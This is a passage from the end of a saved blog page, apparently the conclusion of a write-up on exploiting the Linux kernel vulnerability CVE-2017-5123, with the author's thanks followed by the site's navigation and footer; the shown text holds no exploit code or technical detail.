I’ve provided you with all the necessary information on how I exploited it. If I can, you can too :).</p>
<p>This is also more directed at presenting the exploit’s techniques given this primitive rather than this specific vulnerability. Obviously, we can do both :)</p>
<h2 id="conclusion">Conclusion</h2>
<p>You’ve now seen that a vulnerability of this type, by itself, can still be dangerous when exploiting the Linux kernel.</p>
<p>I hope you enjoyed this write-up.</p>
<p>Thanks again spender, André Baptista <a href="https://twitter.com/0xACB">@0xACB</a>, and all xSTF.<br>
Also a big thanks to <a href="https://twitter.com/osxreverser">@osxreverser</a> for letting me post this in the legendary
<a href="https://put.as/">put.as</a> ;).<br>
Shout-out to .pt :).</p>
<p>Happy Hacking!!</p>
<p><a href="https://twitter.com/uid1000">https://twitter.com/uid1000</a></p>
<p>Thanks,<br>
Federico Bento</p>
      </article>

      <ul class="pager blog-pager">
        
          <li class="previous">
            <a href="https://reverse.put.as/2017/07/10/compiling-afl-osx-llvm-mode/" data-toggle="tooltip" data-placement="top" title="How to compile AFL&#39;s LLVM mode in OS X">← Previous Post</a>
          </li>
        
        
          <li class="next">
            <a href="https://reverse.put.as/2018/01/07/measuring-osx-meltdown-patches-performance/" data-toggle="tooltip" data-placement="top" title="Measuring OS X Meltdown Patches Performance">Next Post →</a>
          </li>
        
      </ul>

      

    </div>
  </div>
</div>

    <footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
                <a href="mailto:reverser@put.as">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
                <a href="https://github.com/gdbinit">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
                <a href="https://twitter.com/osxreverser">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
          
          <li>
            <a href="https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/" title="RSS">
              <span class="fa-stack fa-lg">
                <i class="fas fa-circle fa-stack-2x"></i>
                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
        </ul>
        <p class="credits copyright text-muted">
          (c) fG!
          &nbsp;•&nbsp;
          2021

          
            &nbsp;•&nbsp;
            <a href="https://reverse.put.as/">Reverse Engineering</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="http://gohugo.io/">Hugo</a> powered &nbsp;•&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>          
        </p>
      </div>
    </div>
  </div>
</footer>

<script src="./2017 - Exploiting CVE-2017-5123_files/jquery-3.6.0.min.js.下載"></script>
<script src="./2017 - Exploiting CVE-2017-5123_files/bootstrap.min.js.下載"></script>
<script src="./2017 - Exploiting CVE-2017-5123_files/main.min.js.下載"></script>

<script src="./2017 - Exploiting CVE-2017-5123_files/highlight.min.js.下載"></script>
<script> hljs.initHighlightingOnLoad(); </script>




  


</body></html>